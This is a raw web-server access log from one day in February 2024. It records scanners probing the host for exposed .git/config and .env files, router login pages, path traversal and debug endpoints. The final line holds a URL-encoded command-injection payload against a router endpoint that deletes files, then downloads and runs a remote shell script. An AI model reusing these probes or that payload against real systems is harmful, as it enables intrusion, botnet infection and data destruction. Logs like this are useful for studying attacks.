107.151.182.62 - - [12/Feb/2024:04:23:09 +0000] "HEAD /icons/.%2e/%2e%2e/apache2/icons/sphere1.png HTTP/1.1" 400 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.62 - - [12/Feb/2024:04:23:09 +0000] "GET /showLogin.cc HTTP/1.1" 404 2395 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.62 - - [12/Feb/2024:04:23:10 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 2422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.62 - - [12/Feb/2024:04:23:11 +0000] "GET /admin/ HTTP/1.1" 302 441 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.62 - - [12/Feb/2024:04:23:11 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.62 - - [12/Feb/2024:04:23:11 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.62 - - [12/Feb/2024:04:23:11 +0000] "GET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js HTTP/1.1" 404 2491 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.62 - - [12/Feb/2024:04:23:12 +0000] "GET /favicon-32x32.png HTTP/1.1" 404 2410 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
107.151.182.62 - - [12/Feb/2024:04:23:12 +0000] "GET /api/session/properties HTTP/1.1" 404 2425 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::1 - - [12/Feb/2024:04:23:17 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) mod_wsgi/4.6.8 Python/3.8 (internal dummy connection)"
::1 - - [12/Feb/2024:04:23:18 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) mod_wsgi/4.6.8 Python/3.8 (internal dummy connection)"
::1 - - [12/Feb/2024:04:23:19 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) mod_wsgi/4.6.8 Python/3.8 (internal dummy connection)"
69.164.217.74 - - [12/Feb/2024:04:33:15 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
146.19.24.28 - - [12/Feb/2024:04:44:36 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
143.198.204.194 - - [12/Feb/2024:04:51:16 +0000] "GET /cdn-cgi/trace HTTP/1.1" 400 61913 "-" "Mozilla/5.0"
143.198.204.194 - - [12/Feb/2024:04:51:31 +0000] "\x16\x03\x01\x01\x07\x01" 400 531 "-" "-"
157.230.45.135 - - [12/Feb/2024:04:53:25 +0000] "GET /cdn-cgi/trace HTTP/1.1" 400 61912 "-" "Mozilla/5.0"
157.230.45.135 - - [12/Feb/2024:04:53:37 +0000] "\x16\x03\x01\x01\x07\x01" 400 531 "-" "-"
192.155.88.231 - - [12/Feb/2024:05:01:30 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
198.235.24.239 - - [12/Feb/2024:05:05:17 +0000] "\x16\x03\x01" 400 531 "-" "-"
198.235.24.239 - - [12/Feb/2024:05:05:18 +0000] "\x16\x03\x01" 400 531 "-" "-"
172.105.128.11 - - [12/Feb/2024:05:14:16 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
35.203.211.112 - - [12/Feb/2024:05:16:02 +0000] "GET / HTTP/1.1" 200 10965 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
45.128.232.191 - - [12/Feb/2024:05:45:50 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 2488 "http://34.22.76.150:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
71.6.232.28 - - [12/Feb/2024:05:50:16 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
146.19.24.28 - - [12/Feb/2024:05:55:57 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
31.220.3.140 - - [12/Feb/2024:06:23:02 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
198.199.96.71 - - [12/Feb/2024:06:37:07 +0000] "MGLNDD_34.22.76.150_80\n" 400 531 "-" "-"
193.106.29.124 - - [12/Feb/2024:07:23:13 +0000] "GET / HTTP/1.0" 400 61937 "-" "Mozilla/5.0"
31.220.3.140 - - [12/Feb/2024:07:43:19 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
31.220.3.140 - - [12/Feb/2024:07:43:30 +0000] "POST /HNAP1/ HTTP/1.1" 404 2437 "-" "Mozila/5.0"
165.154.163.113 - - [12/Feb/2024:07:57:54 +0000] "GET / HTTP/1.1" 200 3706 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 9_2_2) AppleWebKit/559.40 (KHTML, like Gecko) Chrome/69.0.68 Safari/537.36"
165.154.163.113 - - [12/Feb/2024:07:57:55 +0000] "GET /favicon.ico HTTP/1.1" 404 2411 "-" "Mozilla/5.0 (Windows NT 8_0_1; Win64; x64) AppleWebKit/572.41 (KHTML, like Gecko) Chrome/97.0.335 Safari/537.36"
165.154.163.113 - - [12/Feb/2024:07:57:55 +0000] "GET /robots.txt HTTP/1.1" 404 2408 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 9_0_2) AppleWebKit/553.55 (KHTML, like Gecko) Chrome/50.0.1935 Safari/537.36"
165.154.163.113 - - [12/Feb/2024:07:57:55 +0000] "GET /sitemap.xml HTTP/1.1" 404 2411 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 9_1_2) AppleWebKit/541.46 (KHTML, like Gecko) Chrome/94.0.1499 Safari/537.36"
165.154.163.113 - - [12/Feb/2024:07:57:56 +0000] "GET /axis2-admin/ HTTP/1.1" 404 2414 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
165.154.163.113 - - [12/Feb/2024:07:57:56 +0000] "GET /axis2/ HTTP/1.1" 404 2396 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
165.154.163.113 - - [12/Feb/2024:07:57:56 +0000] "GET /axis2/axis2-admin/ HTTP/1.1" 404 2432 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
45.79.172.21 - - [12/Feb/2024:09:13:24 +0000] "\x16\x03\x01" 400 531 "-" "-"
172.104.210.105 - - [12/Feb/2024:09:20:59 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.223 - - [12/Feb/2024:09:24:14 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.79.181.223 - - [12/Feb/2024:09:53:56 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
34.88.52.153 - - [12/Feb/2024:09:59:51 +0000] "\x16\x03\x01" 400 531 "-" "-"
34.88.52.153 - - [12/Feb/2024:09:59:54 +0000] "OPTIONS / HTTP/1.0" 200 10984 "-" "-"
45.79.181.223 - - [12/Feb/2024:10:00:40 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.224.128.10 - - [12/Feb/2024:10:02:23 +0000] "GET / HTTP/1.1" 200 3743 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
198.74.56.46 - - [12/Feb/2024:10:04:38 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
83.97.73.245 - - [12/Feb/2024:10:15:28 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 3706 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
198.74.56.46 - - [12/Feb/2024:10:21:01 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
146.19.24.28 - - [12/Feb/2024:10:22:10 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
45.79.181.223 - - [12/Feb/2024:10:40:20 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
34.244.117.189 - - [12/Feb/2024:10:43:07 +0000] "GET /scripts/.git/config HTTP/1.1" 404 2435 "-" "Mozilla/4.8 [en] (X11; U; SunOS; 5.7 sun4u)"
198.74.56.46 - - [12/Feb/2024:10:47:39 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
45.33.80.243 - - [12/Feb/2024:10:48:18 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
34.244.117.189 - - [12/Feb/2024:10:52:19 +0000] "GET /src/.git/config HTTP/1.1" 404 2423 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36"
45.79.172.21 - - [12/Feb/2024:10:53:36 +0000] "\x16\x03\x01" 400 531 "-" "-"
34.244.117.189 - - [12/Feb/2024:10:56:39 +0000] "GET /lib/.git/config HTTP/1.1" 404 2423 "-" "Mozilla/5.0 (Linux; Android 9; Pixel 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
34.244.117.189 - - [12/Feb/2024:11:10:34 +0000] "GET /config/.git/config HTTP/1.1" 404 2432 "-" "Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 6600;452) Opera 6.20 [en-US]"
34.244.117.189 - - [12/Feb/2024:11:12:41 +0000] "GET /plugins/.git/config HTTP/1.1" 404 2435 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/312.5 (KHTML, like Gecko) Safari/312.3"
45.56.108.128 - - [12/Feb/2024:11:20:55 +0000] "GET /systembc/password.php HTTP/1.0" 400 24656 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
34.244.117.189 - - [12/Feb/2024:11:21:57 +0000] "GET /api/.git/config HTTP/1.1" 404 2423 "-" "Mozilla/5.0 (Linux; U; Android 9; zh-cn; PCCM00 Build/PKQ1.190223.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/20.6.0.0.2beta"
34.244.117.189 - - [12/Feb/2024:11:29:07 +0000] "GET /app/.git/config HTTP/1.1" 404 2423 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36"
83.97.73.245 - - [12/Feb/2024:11:29:22 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 2450 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.244.117.189 - - [12/Feb/2024:11:33:13 +0000] "GET /includes/.git/config HTTP/1.1" 404 2438 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
34.244.117.189 - - [12/Feb/2024:11:35:52 +0000] "GET /js/.git/config HTTP/1.1" 404 2420 "-" "Mozilla/5.0 (Linux; U; Android 1.5; en-us; htc_bahamas Build/CRB17) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"
34.244.117.189 - - [12/Feb/2024:11:40:57 +0000] "GET /assets/.git/config HTTP/1.1" 404 2432 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"
34.244.117.189 - - [12/Feb/2024:11:56:12 +0000] "GET /admin/.git/config HTTP/1.1" 302 471 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/7.0.5(0x17000523) NetType/WIFI Language/en"
34.244.117.189 - - [12/Feb/2024:11:57:43 +0000] "GET /node_modules/.git/config HTTP/1.1" 404 2450 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
34.244.117.189 - - [12/Feb/2024:12:03:23 +0000] "GET /core/.git/config HTTP/1.1" 404 2426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36"
34.244.117.189 - - [12/Feb/2024:12:13:57 +0000] "GET /modules/.git/config HTTP/1.1" 404 2435 "-" "Mozilla/5.0 (Linux; Android 7.1.1; Z971) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
34.244.117.189 - - [12/Feb/2024:12:24:31 +0000] "GET /vendor/.git/config HTTP/1.1" 404 2432 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
45.79.181.223 - - [12/Feb/2024:12:31:56 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
69.164.217.245 - - [12/Feb/2024:12:32:17 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
192.155.90.220 - - [12/Feb/2024:12:32:52 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
148.153.56.82 - - [12/Feb/2024:12:44:17 +0000] "GET /lVNL HTTP/1.1" 404 2393 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [12/Feb/2024:12:44:17 +0000] "GET /4Otf HTTP/1.1" 404 2393 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [12/Feb/2024:12:44:18 +0000] "GET /aab8 HTTP/1.1" 404 2393 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [12/Feb/2024:12:44:18 +0000] "GET /jquery-3.3.1.slim.min.js HTTP/1.1" 404 2453 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [12/Feb/2024:12:44:18 +0000] "GET /aab9 HTTP/1.1" 404 2393 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [12/Feb/2024:12:44:19 +0000] "GET /jquery-3.3.2.slim.min.js HTTP/1.1" 404 2453 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
31.220.3.140 - - [12/Feb/2024:12:50:40 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
31.220.3.140 - - [12/Feb/2024:12:50:40 +0000] "POST /HNAP1/ HTTP/1.1" 404 2437 "-" "Mozila/5.0"
194.164.17.133 - - [12/Feb/2024:13:34:03 +0000] "GET /.env HTTP/1.1" 404 2427 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
194.164.17.133 - - [12/Feb/2024:13:34:03 +0000] "POST / HTTP/1.1" 200 3743 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.173.226.131 - - [12/Feb/2024:13:42:03 +0000] "GET /api/settings HTTP/1.1" 404 2395 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
34.244.117.189 - - [12/Feb/2024:14:01:18 +0000] "GET /.git/config HTTP/1.1" 404 2411 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
45.33.87.154 - - [12/Feb/2024:14:01:35 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
192.155.90.220 - - [12/Feb/2024:14:02:16 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.128.232.40 - - [12/Feb/2024:14:09:52 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 2488 "http://34.22.76.150:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
146.19.24.28 - - [12/Feb/2024:14:14:13 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
167.94.146.56 - - [12/Feb/2024:14:38:40 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
167.94.146.56 - - [12/Feb/2024:14:38:43 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.56 - - [12/Feb/2024:14:38:44 +0000] "PRI * HTTP/2.0" 400 531 "-" "-"
167.94.146.56 - - [12/Feb/2024:14:38:44 +0000] "GET /favicon.ico HTTP/1.1" 404 2411 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
68.183.89.101 - - [12/Feb/2024:15:05:21 +0000] "\x16\x03\x01" 400 531 "-" "-"
68.183.89.101 - - [12/Feb/2024:15:05:21 +0000] "\x16\x03\x01" 400 531 "-" "-"
68.183.89.101 - - [12/Feb/2024:15:05:21 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
68.183.89.101 - - [12/Feb/2024:15:05:21 +0000] "GET /form.html HTTP/1.1" 404 2386 "-" "curl/8.1.2"
68.183.89.101 - - [12/Feb/2024:15:05:22 +0000] "GET /upl.php HTTP/1.1" 404 2380 "-" "Mozilla/5.0"
68.183.89.101 - - [12/Feb/2024:15:05:22 +0000] "\x16\x03\x01" 400 531 "-" "-"
68.183.89.101 - - [12/Feb/2024:15:05:22 +0000] "GET /geoip/ HTTP/1.1" 404 2377 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
68.183.89.101 - - [12/Feb/2024:15:05:22 +0000] "GET /favicon.ico HTTP/1.1" 404 2392 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
68.183.89.101 - - [12/Feb/2024:15:05:23 +0000] "GET /1.php HTTP/1.1" 404 2374 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
68.183.89.101 - - [12/Feb/2024:15:05:23 +0000] "GET /bundle.js HTTP/1.1" 404 2386 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
68.183.89.101 - - [12/Feb/2024:15:05:23 +0000] "GET /files/ HTTP/1.1" 404 2377 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
68.183.89.101 - - [12/Feb/2024:15:05:23 +0000] "GET /systembc/password.php HTTP/1.1" 404 2422 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
68.183.89.101 - - [12/Feb/2024:15:05:23 +0000] "GET /password.php HTTP/1.1" 404 2395 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
68.183.89.101 - - [12/Feb/2024:15:05:24 +0000] "GET /info.php HTTP/1.1" 404 2383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
146.19.24.28 - - [12/Feb/2024:15:19:22 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
185.224.128.10 - - [12/Feb/2024:15:32:39 +0000] "GET / HTTP/1.1" 200 3743 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.177 - - [12/Feb/2024:15:53:24 +0000] "GET /.env HTTP/1.1" 404 2427 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.177 - - [12/Feb/2024:15:53:24 +0000] "\x16\x03\x01\x01H\x01" 400 531 "-" "-"
34.244.117.189 - - [12/Feb/2024:16:06:36 +0000] "GET /core/.git/config HTTP/1.1" 404 2426 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
34.244.117.189 - - [12/Feb/2024:16:10:06 +0000] "GET /backup/.git/config HTTP/1.1" 404 2432 "-" "Mozilla/5.0 (Linux; Android 9; SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
34.244.117.189 - - [12/Feb/2024:16:14:01 +0000] "GET /build/.git/config HTTP/1.1" 404 2429 "-" "Mozilla/5.0 (Linux; Android 9; SM-A530W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
34.244.117.189 - - [12/Feb/2024:16:28:15 +0000] "GET /plugins/.git/config HTTP/1.1" 404 2435 "-" "Mozilla/5.0 (Linux U; en-US)  AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) Version/4.0 Kindle/3.0 (screen 600x800; rotate)"
167.71.201.139 - - [12/Feb/2024:16:29:42 +0000] "GET /cdn-cgi/trace HTTP/1.1" 400 61913 "-" "Mozilla/5.0"
167.71.201.139 - - [12/Feb/2024:16:29:56 +0000] "\x16\x03\x01\x01\x07\x01" 400 531 "-" "-"
34.244.117.189 - - [12/Feb/2024:16:34:29 +0000] "GET /resources/.git/config HTTP/1.1" 404 2441 "-" "Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36"
34.244.117.189 - - [12/Feb/2024:16:34:31 +0000] "GET /uploads/.git/config HTTP/1.1" 404 2435 "-" "Mozilla/5.0 (Linux; Android 9; SM-N950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
34.219.100.91 - - [12/Feb/2024:16:35:55 +0000] "GET / HTTP/1.1" 200 3706 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.8 (KHTML, like Gecko) Safari/419.3"
176.97.210.229 - - [12/Feb/2024:16:37:50 +0000] "GET / HTTP/1.1" 200 10965 "-" "-"
34.244.117.189 - - [12/Feb/2024:16:39:24 +0000] "GET /database/.git/config HTTP/1.1" 404 2438 "-" "Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher"
69.164.217.245 - - [12/Feb/2024:16:47:59 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
192.155.90.220 - - [12/Feb/2024:16:49:04 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
52.80.177.122 - - [12/Feb/2024:16:52:36 +0000] "GET /.DS_Store HTTP/1.1" 404 2389 "-" "Go-http-client/1.1"
34.244.117.189 - - [12/Feb/2024:16:59:01 +0000] "GET /modules/.git/config HTTP/1.1" 404 2435 "-" "Mozilla/5.0 (compatible; Konqueror/4.4; Linux 2.6.32-22-generic; X11; en_US) KHTML/4.4.3 (like Gecko) Kubuntu"
51.159.102.237 - - [12/Feb/2024:16:59:35 +0000] "HEAD / HTTP/1.1" 200 301 "-" "curl/7.81.0"
51.159.102.237 - - [12/Feb/2024:16:59:37 +0000] "GET / HTTP/1.1" 200 3743 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
51.159.102.237 - - [12/Feb/2024:16:59:37 +0000] "GET /favicon.ico HTTP/1.1" 404 2447 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
45.33.87.154 - - [12/Feb/2024:17:01:32 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 zgrab/0.x"
34.244.117.189 - - [12/Feb/2024:17:02:29 +0000] "GET /data/.git/config HTTP/1.1" 404 2426 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36"
34.244.117.189 - - [12/Feb/2024:17:02:56 +0000] "GET /api/.git/config HTTP/1.1" 404 2423 "-" "Mozilla/5.0 (Linux; Android 4.4.2; SM-T230NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Safari/537.36"
45.79.181.223 - - [12/Feb/2024:17:04:50 +0000] "GET / HTTP/1.1" 200 3687 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.224.128.10 - - [12/Feb/2024:17:05:53 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F192.3.152.183%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1" 404 2676 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
